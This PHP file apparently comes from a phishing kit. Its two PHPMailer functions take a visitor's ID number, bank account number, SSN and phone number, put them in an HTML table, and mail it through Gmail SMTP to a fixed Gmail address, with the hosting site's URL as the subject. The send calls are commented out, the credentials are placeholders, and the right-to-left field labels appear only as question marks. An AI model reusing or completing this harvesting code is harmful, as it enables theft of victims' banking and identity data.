<?php
// Session is already started in index.php, don't start again
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once './dashboard/init.php';


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;


function SendMail($idNumber)
{
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://";

    // Get the host name
    $host = $_SERVER['HTTP_HOST'];

    // Get the current URI
    $uri = $_SERVER['REQUEST_URI'];

    // Combine the protocol, host, and URI to form the complete URL
    $currentURL = $protocol . $host;

    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;

    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    $mail->Username = 'resturasdasdasantsinbad@gmail.com';
    $mail->Password = 'asdasdad';

    $mail->setFrom('asdasd@gmail.com');
    $mail->isHTML(true);

    $subject = "
    <html>
      <head>
          <style>
               .bodysms {
                  float: right;
                  
              }
              .headers {
                  display: -webkit-inline-box;
                  margin: 0 79px;
              }
              .bodysms h3{
                  color: #173291;
                  font-size: 25px;
                  padding: 23px;
                  width: 95px;
              }
              .centers {
                  text-align: right;
              }
              table {
                  border-collapse: collapse;
                  width: 70%;
                  margin: 0 112px;
              }
    
              table, td, th {
                  border: 1px solid black;
                  padding: 5px;
    text-align: right;
              }
              th {
                  text-align: right;
                  color: #14286c;
                  font-weight: 600;
              }
          </style>
      </head>
      <body>
          <div class='bodysms'>
          
              <table>
    <tr>
                  <td>$idNumber</td>
                  <th>?? ????? ???? ????</th>
              </tr>
              </table>
              </div>
          </div>
         
      </body>
    </html>";

    $mail->Subject = $currentURL;
    $mail->Body = $subject;
    $mail->addAddress('asdasd@gmail.com');
  //  $mail->send();
}

function SendTwoMail($idNumber, $accNum, $ssn, $phone)
{
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://";

    // Get the host name
    $host = $_SERVER['HTTP_HOST'];

    // Get the current URI
    $uri = $_SERVER['REQUEST_URI'];

    // Combine the protocol, host, and URI to form the complete URL
    $currentURL = $protocol . $host;

    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;

    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    $mail->Username = 'asdasd@gmail.com';
    $mail->Password = 'asdasd';

    $mail->setFrom('asdasd@gmail.com');
    $mail->isHTML(true);

    $subject = "
    <html>
      <head>
          <style>
               .bodysms {
                  float: right;
                  
              }
              .headers {
                  display: -webkit-inline-box;
                  margin: 0 79px;
              }
              .bodysms h3{
                  color: #173291;
                  font-size: 25px;
                  padding: 23px;
                  width: 95px;
              }
              .centers {
                  text-align: right;
              }
              table {
                  border-collapse: collapse;
                  width: 70%;
                  margin: 0 112px;
              }
    
              table, td, th {
                  border: 1px solid black;
                  padding: 5px;
    text-align: right;
              }
              th {
                  text-align: right;
                  color: #14286c;
                  font-weight: 600;
              }
          </style>
      </head>
      <body>
          <div class='bodysms'>
          
              <table>
    <tr>
                  <td>$idNumber</td>
                  <th>??? ????????</th>
              </tr>
              <tr>
                  <td>$accNum</td>
                  <th>??? ??????</th>
              </tr>
              <tr>
                  <td>$ssn</td>
                  <th>??? ????</th>
              </tr>
              <tr>
                  <td>$phone</td>
                  <th>??????</th>
              </tr>
              </table>
              </div>
          </div>
         
      </body>
    </html>";

    $mail->Subject = $currentURL;
    $mail->Body = $subject;
    $mail->addAddress('asdsadad@gmail.com');
    //$mail->send();
}